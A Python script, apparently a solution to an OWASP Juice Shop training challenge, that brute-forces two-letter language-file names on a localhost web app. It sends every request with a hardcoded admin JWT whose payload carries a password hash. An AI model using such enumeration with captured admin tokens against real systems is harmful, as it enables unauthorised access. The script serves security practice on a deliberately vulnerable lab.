import requests

def brute_force_json_file():
    base_url = 'http://localhost:3000/assets/i18n/'  
    token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6IkoxMjkzNEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiM2MyYWJjMDRlNGE2ZWE4ZjEzMjdkMGFhZTM3MTRiN2QiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMTI3LjAuMC4xIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTA1LTMxIDE2OjU2OjU1LjQ4MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTA2LTAzIDAxOjEwOjU3LjY5MiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2ODU3NTc3NDUsImV4cCI6MTY4NTc3NTc0NX0.LESFENqavQck9xPJs01SwN5I6f_SQttmZ6Yl8RMgFsyGNeIU5krqKOQrOp6lTl2ZLtLZuUT69LUui10CwvNTR48eoqbNB588-_60F0oj0MEVqNrij4SeXr-JPrRvtvqVg1aDNooZINYCbVdUEiZe7GD_EBbsYY5InIzE1z7n5EE'

    for letter1 in range(65, 91):  # From A to Z in ASCII
        for letter2 in range(65, 91):
            file_name = 'tlh_{}{}.json'.format(chr(letter1), chr(letter2))
            url = base_url + file_name
            headers = {'Authorization': 'Bearer ' + token}
            response = requests.get(url, headers=headers)

            if response.status_code == 200:
                return 'Found language file {}'.format(file_name)

    return 'Didnt find any language file'

result = brute_force_json_file()
print(result)